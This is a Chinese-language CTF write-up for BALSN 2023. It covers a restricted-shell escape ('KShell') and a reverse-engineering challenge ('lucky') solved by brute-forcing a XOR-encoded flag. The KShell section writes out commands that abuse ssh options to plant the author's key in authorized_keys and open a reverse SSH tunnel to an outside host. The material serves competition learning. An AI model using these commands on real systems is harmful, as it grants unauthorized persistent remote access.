---
title: "BALSN 2023 WriteUp"
date: 2023-10-18T00:00:00+08:00
draft: false
github_link: "https://github.com/Jimmy01240397/CTF-writeup"
author: "Chumy"
tags:
  - CTF
image: /images/CTF.png
description: ""
toc: 
---

# balsn-2023-writeup

與 B33f 50UP 戰隊一起合打的。

## 戰績

![image](https://github.com/user-attachments/assets/c90ad3e2-3195-4f15-9c40-658aa691e53e)

## KShell

![](https://hackmd.io/_uploads/rkolW8TWT.png)


連到 `nc kshell.balsnctf.com 7122` 會有一個受限的 shell 要做逃脫，用 `help` 看能用的指令只有這些，沒有 pipe 沒有 redirect
![](https://hackmd.io/_uploads/r1ex_ra-p.png)
裡面最複雜的應該是 `ssh` 所以從他開刀。思路大概是想辦法找到 `自由寫檔` 把 ssh key 寫進 .ssh/authorized_keys 然後從裡面把 ssh port 用 ssh tunnel 打出去再從外面 ssh 打進去。
原本是想利用 -E 可以把 stderr 寫到特定檔案這點。因此想辦法尋找一些可控的 field 並且是最前面的來做到寫 key。原本是想用 username 然後讓他出現 `<username>@<hostname> Permission denied (publickey)` 的 log。
```bash
ssh -E .ssh/authorized_keys "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy"@localhost
```
然而在裡面測試後發現他的 ssh Permission denied 訊息沒有 username 如：`Permission denied (publickey)` 這就頭痛了。後來有想到用 filename。
```bash
ssh -E "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy@localhost"

ssh -E .ssh/authorized_keys -F "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M= chumy@localhost" localhost
```

然而 key 裡面的 `/` 會有影響，而且 rsa 的 key 太長了 (當時沒有想到可以用 ecdsa 所以就跟官方解擦身而過了 QQ)

最後我突然注意到 `.ssh/known_hosts` 不也是 ssh 的 public key 嗎？我只要想辦法把 hostname 改成 authorized_keys 的特殊參數組成類似下面的格式就可以了。
```
pty ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQChf0A6FHxCsg7dC2BLL3+AC+ATBX2PQZytTCna185OE1oG4/2j0EjznpvNZzX/Z8N/w3CDe5Wqv9aGbFv8zAhC3GlW8RzadgiQbegFk1qH1ZmIaj3UC4o7pTqgBhSsb1Zs4HqC8+MTTM5YxXKb8WbHvPb0wt2CRX6PyM3EWJYcTJjbx/gB7ZCqElY9+Gwv5Drcl7GexjJwWYNbWkyJqOpsBRWDjtaXxKo3lgUK4ePXZr8Qjv13oO5AnavcrpluwN278EOUbT0/v7y/intntlai/N75Tg14sL6oMBmxV1p3tbyTkFqbN6IdGXrxOXZ3tE04E0p5CxYxscYeTDjgY4hvZ+GiW7FoVofOeiTKEqvu/kJARxcJsds4xOqFk8WGUtD4i72ViVowPJZvVVztNExcKziCFKfYNt00d3TVert4tmLhI/Jw6u+Vy2Egjr/9xemCz6rfCJpDTsRjLA1LGPoiPmbCgJKE8ObjW5Yokb2meB4Wjsc6sCXxNDhwiNvcF8M=
```
於是就構建了下面的 payload
```bash
ssh -o UserKnownHostsFile=.ssh/authorized_keys -o HostKeyAlias=pty root@<remote hostname>
```
![](https://hackmd.io/_uploads/Sy9R1IT-a.png)

接下來就是從裡面打 ssh tunnel 出來了。
```bash
ssh -R 2222:localhost:22 root@<remote hostname>
```

然後在遠端伺服器把 `/etc/ssh/` 下面的 host key 複製到 `.ssh/` 下面然後
```bash
ssh kShell@localhost -p 2222
```

然後 ssh 就成功登進去了，flag 找一下。

flag: `BALSN{h0w_d1d_u_g3t_RCE_on_my_kSSHell??}`

## lucky
他給一個執行檔，跑起來會卡住。 string 一下
![](https://hackmd.io/_uploads/HyP-iUaWp.png)

然後用 IDA 開查一下 `Lucky! flag is %s` 的位置。
![](https://hackmd.io/_uploads/S1OviIT-T.png)

然後直接解壞給我看...
![](https://hackmd.io/_uploads/HkcKsUTb6.png)

用 Ghidra 開

![](https://hackmd.io/_uploads/BJeZpU6-6.png)

太棒了沒解壞
讀一下看起來是會先進到一個跑 10000000000000000 次的迴圈，裡面每次都會生兩個 uint 隨機數 % 100000000 以後再開平方並加起來檢查是否 > 9999999999999999 如果是的話就把 `IVar4` - 1 ，然後每個迴圈都會做一次 + 1 （其實本質上還是生成隨機數）。
離開迴圈後，把這個數 * 4 + -30000000000000000 然後轉字串接著將位置在 0x498040 ~ 0x498067 的資料與這個數字字串做 xor 就能得到 Flag 了（雖說這樣講但到頭來那個數字還是得用猜的）。

![](https://hackmd.io/_uploads/BJHy0v6Zp.png)

雖然要猜，但是一些部分還是有跡可循，首先數字字串並沒有 0x28 那麼長，xor 的過程中 index 到 0xf 就會回到 0x0 了所以一定有些部分是用一樣的數字然後 flag 是 BALSN{printable+} 所以我們可以用前面 `BALSN{` 跟後面 `}` 取得那個位置的數字，接著找其他也用這個數字的位置換成 flag 我們就可以得出這個。
```python
data = b"\x73\x75\x7D\x66\x77\x49\x5A\x60\x50\x7E\x67\x08\x44\x66\x40\x02\x5E\x7B\x01\x7A\x66\x03\x5B\x65\x03\x47\x0F\x0D\x59\x4D\x6C\x5B\x7F\x6B\x52\x02\x7F\x13\x15\x48"
prefix = b"BALSN{\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}"
check = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"


check = bytearray(check)

for a in range(len(data)):
    if prefix[a] != 0:
        check[a & 0xf] = prefix[a] ^ data[a]

check = bytes(check)

print(check)

ans = b""

for a in range(len(data)):
    if check[a & 0xf] != 0:
        ans += bytes([check[a & 0xf] ^ data[a]])
    else:
        ans += b'\x00'

print(ans)

```
![](https://hackmd.io/_uploads/ryvs4Dp-a.png)
然後未知的部分我們可以用爆的看看，首先找到未知的位置從 0~9 測一次會不會出現 printable 的字元如果有我們再用相同的數字測看看用同樣數字 index 的其他位置是不是有 printable 的字元，然後把所有符合規則的可能印出來。但是因為這個可能還是很龐大，所以我們可以先把 printable 的字元 list 縮小一下
```python
#printable = b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!"#$%&\'()*+,-./:;<=>?@[\\]^_`{|}~'
printable = b'0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ!_'

data = b"\x73\x75\x7D\x66\x77\x49\x5A\x60\x50\x7E\x67\x08\x44\x66\x40\x02\x5E\x7B\x01\x7A\x66\x03\x5B\x65\x03\x47\x0F\x0D\x59\x4D\x6C\x5B\x7F\x6B\x52\x02\x7F\x13\x15\x48"
prefix = b"BALSN{\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00}"

def getans(check):
    ans = b''
    for a in range(len(data)):
        if check[a & 0xf] != 0:
            ans += bytes([check[a & 0xf] ^ data[a]])
        else:
            ans += b'\x00'
    print(ans)

def trycheck(check, index):
    check = bytearray(check)
    if prefix[index] != 0:
        check[index & 0xf] = prefix[index] ^ data[index]
        if index + 1 < len(data):
            trycheck(bytes(check), index+1)
        elif int((int(bytes(check).decode()) + 30000000000000000) / 4) * 4 == \
             int(bytes(check).decode()) + 30000000000000000:
            getans(check)
    elif check[index & 0xf] != 0:
        if index + 1 < len(data):
            trycheck(bytes(check), index+1)
        elif int((int(bytes(check).decode()) + 30000000000000000) / 4) * 4 == \
             int(bytes(check).decode()) + 30000000000000000:
            getans(check)
    else:
        for a in range(10):
            if bytes([ord(str(a)) ^ data[index]]) in printable and \
               bytes([ord(str(a)) ^ data[index | 0x10]]) in printable and \
               (index | 0x20 >= len(data) or \
               bytes([ord(str(a)) ^ data[index | 0x20]]) in printable):
                check[index & 0xf] = ord(str(a))
                if index + 1 < len(data):
                    trycheck(bytes(check), index+1)
                elif int((int(bytes(check).decode()) + 30000000000000000) / 4) * 4 == \
                     int(bytes(check).decode()) + 30000000000000000:
                    getans(check)


checktmp = b"\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00"

trycheck(checktmp, 0)
```

然後把一些看起來從頭到尾沒變過的濾出來得到 `b'BALSN{nU\x00\x00\x00\x00\x00\x00\x00\x00oO0O_1oP\x00\x00\x00\x00\x00\x00\x00\x00N_c7F!!}'`
然後更新一下 `prefix` 再測一次，這次再跑完以後翻找出一個看起來有比較多合理單字的 flag 得到：
`b'BALSN{nUdK_1s_s0oO0O_1oP7r74nt_iN_c7F!!}'`
然後把不太像的字元拔掉
`b'BALSN{nU\x00\x00_1s_s0oO0O_1oP\x00\x00\x00\x00\x00\x00_iN_c7F!!}'`
更新一下 `prefix` 再測一次

![](https://hackmd.io/_uploads/S1JstvaWa.png)

這次的結果數量就少很多，可以試著把 printable 的字元增加一些或全部使用。
執行後看起來還是沒有合理的單字，可能是有單字是錯的，所以把不太像的字元拔掉
`b'BALSN{\x00\x00\x00\x00_1s_s0oO0O_1\x00\x00\x00\x00\x00\x00\x00\x00_iN_c7F!!}'`
更新一下 `prefix` 再測一次，結果一樣，再刪，這次刪最後面的 `!` 看看。
`b'BALSN{\x00\x00\x00\x00_1s_s0oO0O_1\x00\x00\x00\x00\x00\x00\x00\x00_iN_c7F!\x00}'`
更新一下 `prefix` 再測一次，結果中有一部份的結果最前面的單字是 `lUcK` 符合這個題目的主題，因此得到
`b'BALSN{lUcK_1s_s0oO0O_1\x00\x00\x00\x00\x00\x00\x00\x00_iN_c7F!\x00}'`
更新一下 `prefix` 再測一次
![](https://hackmd.io/_uploads/HkCKswpWp.png)

看起來都合理的單字且能組成一個句子。

flag: `BALSN{lUcK_1s_s0oO0O_1mP0r74nt_iN_c7F!#}`

## 其他戰隊成員的 writeup

[Hackmd](https://hackmd.io/@Vincent550102/rkxqeOJ--a)
